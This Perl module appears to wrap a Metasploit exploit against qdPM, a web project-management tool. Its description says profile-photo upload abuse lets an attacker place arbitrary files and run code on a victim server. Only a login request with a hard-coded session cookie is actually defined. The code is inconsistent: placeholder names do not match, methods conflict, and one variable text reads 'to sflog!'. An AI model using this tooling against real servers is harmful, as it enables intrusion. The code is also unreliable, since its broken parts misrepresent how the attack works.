package QDPM::MSF::QdpmUploadExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "QdpmUploadExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a vulnerability found in qdPM - a web-based project management

        software. The user profile's photo upload feature can be abused to upload any

        arbitrary file onto the victim server machine, which allows remote code execution.

        Please note in order to use this module, you must have a valid credential to sign

        in.

      ",
  METHOD      => "GET",
  MSF_MODULE  => "qdpm_upload_exec",
  OSVDB       => 82978,
  PATHS       => ["qdPM/"],
  PAYLOAD     => "login[email]=__LOGIN[EMAIL]__&login[password]=__LOGIN[PASSWORD]__&http_referer=&",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base directory to sflog!", VALUE => "/qdPM/" },
    'RHOST' =>       { DESCRIPTION => "", VALUE => "" },
    'BASE' =>       { DESCRIPTION => "", VALUE => "" },
    'LOGIN[EMAIL]' =>       { DESCRIPTION => "", VALUE => "" },
    'LOGIN[PASSWORD]' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'index.php/home/login',
      PAYLOAD      => 'login%5bemail%5d=__USERNAME__&login%5bpassword%5d=__PASSWORD__&http_referer=',
      TEXT   => 'Sending Exploit #1 Request : [POST] /index.php/home/login',
      HEADERS      => {
        'Cookie' => 'qdpm=sqMwAFTkiFKCPnPwpWjWFEkzZAu',
        'Origin' => 'http://127.0.0.1',
        'Referer' => 'http://127.0.0.1//MULTI/QDPM/QdpmUploadExec/index.php/home/login',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
